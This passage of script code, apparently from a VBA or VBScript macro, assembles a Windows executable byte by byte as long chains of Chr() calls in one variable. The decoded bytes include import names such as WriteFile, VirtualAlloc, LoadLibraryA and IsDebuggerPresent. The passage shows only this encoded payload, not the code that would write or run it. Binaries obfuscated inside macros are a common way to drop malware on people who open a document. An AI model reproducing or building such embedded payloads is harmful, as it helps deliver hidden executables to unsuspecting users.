GqnqCn=GqnqCn&Chr(101)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(117)&Chr(101)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(77)&Chr(111)&Chr(110)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(83)&Chr(97)&Chr(116)&Chr(0)&Chr(70)&Chr(114)&Chr(105)&Chr(0)&Chr(84)&Chr(104)&Chr(117)&Chr(0)&Chr(87)&Chr(101)&Chr(100)&Chr(0)&Chr(84)&Chr(117)&Chr(101)&Chr(0)&Chr(77)&Chr(111)&Chr(110)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(0)&Chr(200)&Chr(178)&Chr(64)&Chr(0)&Chr(32)&Chr(179)&Chr(64)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(77)&Chr(111)&Chr(110)&Chr(84)&Chr(117)&Chr(101)&Chr(87)&Chr(101)&Chr(100)&Chr(84)&Chr(104)&Chr(117)&Chr(70)&Chr(114)&Chr(105)&Chr(83)&Chr(97)&Chr(116)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(70)&Chr(101)&Chr(98)&Chr(77)&Chr(97)
GqnqCn=GqnqCn&Chr(114)&Chr(65)&Chr(112)&Chr(114)&Chr(77)&Chr(97)&Chr(121)&Chr(74)&Chr(117)&Chr(110)&Chr(74)&Chr(117)&Chr(108)&Chr(65)&Chr(117)&Chr(103)&Chr(83)&Chr(101)&Chr(112)&Chr(79)&Chr(99)&Chr(116)&Chr(78)&Chr(111)&Chr(118)&Chr(68)&Chr(101)&Chr(99)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(72)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(248)&Chr(169)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(176)&Chr(146)&Chr(64)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(38)&Chr(0)&Chr(0)&Chr(128)&Chr(80)&Chr(0)&Chr(0)&Chr(44)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(136)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(145)&Chr(17)&Chr(64)&Chr(0)&Chr(149)&Chr(17)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(87)&Chr(17)&Chr(64)&Chr(0)&Chr(107)&Chr(17)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(200)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(140)&Chr(20)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(140)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(135)&Chr(31)&Chr(64)&Chr(0)&Chr(139)&Chr(31)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(34)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(47)&Chr(34)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(226)&Chr(35)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(238)&Chr(35)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(98)&Chr(40)&Chr(64)&Chr(0)&Chr(102)&Chr(40)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(41)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(45)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(107)&Chr(46)&Chr(64)&Chr(0)&Chr(127)&Chr(46)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(109)&Chr(48)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(48)&Chr(64)&Chr(0)&Chr(20)&Chr(49)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(56)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(204)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(204)&Chr(60)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(121)&Chr(61)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(69)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(124)&Chr(83)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(226)&Chr(89)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(172)&Chr(91)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(93)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(95)&Chr(64)&Chr(0)&Chr(145)&Chr(95)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(140)&Chr(149)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(148)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(150)&Chr(0)&Chr(0)&Chr(134)&Chr(150)&Chr(0)&Chr(0)&Chr(152)&Chr(150)&Chr(0)&Chr(0)&Chr(182)&Chr(150)&Chr(0)&Chr(0)&Chr(202)&Chr(150)&Chr(0)&Chr(0)&Chr(210)&Chr(150)&Chr(0)&Chr(0)&Chr(228)&Chr(150)&Chr(0)&Chr(0)&Chr(242)&Chr(150)&Chr(0)&Chr(0)&Chr(254)&Chr(150)&Chr(0)&Chr(0)&Chr(14)&Chr(151)&Chr(0)&Chr(0)&Chr(36)&Chr(151)&Chr(0)&Chr(0)&Chr(62)&Chr(151)&Chr(0)&Chr(0)&Chr(86)&Chr(151)&Chr(0)&Chr(0)&Chr(112)&Chr(151)&Chr(0)&Chr(0)&Chr(134)&Chr(151)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(150)&Chr(151)&Chr(0)&Chr(0)&Chr(176)&Chr(151)&Chr(0)&Chr(0)&Chr(194)&Chr(151)&Chr(0)&Chr(0)&Chr(208)&Chr(151)&Chr(0)&Chr(0)&Chr(232)&Chr(151)&Chr(0)&Chr(0)&Chr(246)&Chr(151)&Chr(0)&Chr(0)&Chr(2)&Chr(152)&Chr(0)&Chr(0)&Chr(16)&Chr(152)&Chr(0)&Chr(0)&Chr(26)&Chr(152)&Chr(0)&Chr(0)&Chr(50)&Chr(152)&Chr(0)&Chr(0)&Chr(66)&Chr(152)&Chr(0)&Chr(0)&Chr(88)&Chr(152)&Chr(0)&Chr(0)&Chr(112)&Chr(152)&Chr(0)&Chr(0)&Chr(126)&Chr(152)&Chr(0)&Chr(0)&Chr(140)&Chr(152)&Chr(0)&Chr(0)&Chr(152)&Chr(152)&Chr(0)&Chr(0)&Chr(178)&Chr(152)&Chr(0)&Chr(0)&Chr(194)&Chr(152)&Chr(0)&Chr(0)&Chr(216)&Chr(152)&Chr(0)&Chr(0)&Chr(242)&Chr(152)&Chr(0)&Chr(0)&Chr(10)&Chr(153)&Chr(0)&Chr(0)&Chr(34)&Chr(153)&Chr(0)&Chr(0)&Chr(54)&Chr(153)&Chr(0)&Chr(0)&Chr(74)&Chr(153)&Chr(0)&Chr(0)&Chr(102)&Chr(153)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(122)&Chr(153)&Chr(0)&Chr(0)&Chr(138)&Chr(153)&Chr(0)&Chr(0)&Chr(178)&Chr(153)&Chr(0)&Chr(0)&Chr(190)&Chr(153)&Chr(0)&Chr(0)&Chr(200)&Chr(153)&Chr(0)&Chr(0)&Chr(212)&Chr(153)&Chr(0)&Chr(0)&Chr(230)&Chr(153)&Chr(0)&Chr(0)&Chr(242)&Chr(153)&Chr(0)&Chr(0)&Chr(2)&Chr(154)&Chr(0)&Chr(0)&Chr(16)&Chr(154)&Chr(0)&Chr(0)&Chr(28)&Chr(154)&Chr(0)&Chr(0)&Chr(40)&Chr(154)&Chr(0)&Chr(0)&Chr(58)&Chr(154)&Chr(0)&Chr(0)&Chr(74)&Chr(154)&Chr(0)&Chr(0)&Chr(96)&Chr(154)&Chr(0)&Chr(0)&Chr(112)&Chr(154)&Chr(0)&Chr(0)&Chr(130)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(111)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(76)&Chr(105)&Chr(110)&Chr(101)&Chr(65)&Chr(0)&Chr(57)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)
GqnqCn=GqnqCn&Chr(117)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(65)&Chr(0)&Chr(21)&Chr(4)&Chr(83)&Chr(101)&Chr(116)&Chr(85)&Chr(110)&Chr(104)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(99)&Chr(101)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(105)&Chr(108)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(249)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(77)&Chr(111)&Chr(100)&Chr(117)&Chr(108)&Chr(101)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(87)&Chr(0)&Chr(0)&Chr(33)&Chr(4)&Chr(83)&Chr(108)&Chr(101)&Chr(101)&Chr(112)&Chr(0)&Chr(32)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(4)&Chr(1)&Chr(69)&Chr(120)&Chr(105)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(141)&Chr(4)
GqnqCn=GqnqCn&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(0)&Chr(59)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(100)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(0)&Chr(0)&Chr(244)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(77)&Chr(111)&Chr(100)&Chr(117)&Chr(108)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(65)&Chr(0)&Chr(0)&Chr(74)&Chr(1)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(65)&Chr(0)&Chr(191)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(0)&Chr(75)&Chr(1)
GqnqCn=GqnqCn&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(87)&Chr(0)&Chr(122)&Chr(4)&Chr(87)&Chr(105)&Chr(100)&Chr(101)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(84)&Chr(111)&Chr(77)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(0)&Chr(230)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(0)&Chr(0)&Chr(193)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(87)&Chr(0)&Chr(0)&Chr(232)&Chr(3)&Chr(83)&Chr(101)&Chr(116)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(67)
GqnqCn=GqnqCn&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(215)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(0)&Chr(190)&Chr(0)&Chr(68)&Chr(101)&Chr(108)&Chr(101)&Chr(116)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(52)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(71)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(50)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(53)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(83)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(51)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(192)&Chr(2)&Chr(73)&Chr(110)&Chr(116)&Chr(101)
GqnqCn=GqnqCn&Chr(114)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(101)&Chr(100)&Chr(73)&Chr(110)&Chr(99)&Chr(114)&Chr(101)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(236)&Chr(3)&Chr(83)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(0)&Chr(0)&Chr(173)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(100)&Chr(0)&Chr(0)&Chr(188)&Chr(2)&Chr(73)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(101)&Chr(100)&Chr(68)&Chr(101)&Chr(99)&Chr(114)&Chr(101)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(159)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(0)&Chr(0)&Chr(87)&Chr(4)&Chr(86)&Chr(105)&Chr(114)&Chr(116)
GqnqCn=GqnqCn&Chr(117)&Chr(97)&Chr(108)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(161)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(0)&Chr(84)&Chr(3)&Chr(81)&Chr(117)&Chr(101)&Chr(114)&Chr(121)&Chr(80)&Chr(101)&Chr(114)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(110)&Chr(99)&Chr(101)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(102)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(84)&Chr(105)&Chr(99)&Chr(107)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(170)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(100)&Chr(0)&Chr(79)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(84)&Chr(105)&Chr(109)&Chr(101)&Chr(65)
GqnqCn=GqnqCn&Chr(115)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(84)&Chr(105)&Chr(109)&Chr(101)&Chr(0)&Chr(239)&Chr(2)&Chr(76)&Chr(101)&Chr(97)&Chr(118)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(0)&Chr(217)&Chr(0)&Chr(69)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(0)&Chr(45)&Chr(4)&Chr(84)&Chr(101)&Chr(114)&Chr(109)&Chr(105)&Chr(110)&Chr(97)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(169)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(62)&Chr(4)
GqnqCn=GqnqCn&Chr(85)&Chr(110)&Chr(104)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(99)&Chr(101)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(105)&Chr(108)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(209)&Chr(2)&Chr(73)&Chr(115)&Chr(68)&Chr(101)&Chr(98)&Chr(117)&Chr(103)&Chr(103)&Chr(101)&Chr(114)&Chr(80)&Chr(114)&Chr(101)&Chr(115)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(241)&Chr(2)&Chr(76)&Chr(111)&Chr(97)&Chr(100)&Chr(76)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(65)&Chr(0)&Chr(0)&Chr(181)&Chr(2)&Chr(73)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(65)&Chr(110)&Chr(100)&Chr(83)&Chr(112)&Chr(105)&Chr(110)&Chr(67)&Chr(111)&Chr(117)&Chr(110)
GqnqCn=GqnqCn&Chr(116)&Chr(0)&Chr(91)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(80)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(0)&Chr(82)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(65)&Chr(67)&Chr(80)&Chr(0)&Chr(0)&Chr(19)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(79)&Chr(69)&Chr(77)&Chr(67)&Chr(80)&Chr(0)&Chr(0)&Chr(219)&Chr(2)&Chr(73)&Chr(115)&Chr(86)&Chr(97)&Chr(108)&Chr(105)&Chr(100)&Chr(67)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(97)&Chr(103)&Chr(101)&Chr(0)&Chr(157)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(84)&Chr(4)&Chr(86)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(164)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(82)&Chr(101)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(146)&Chr(3)&Chr(82)&Chr(116)
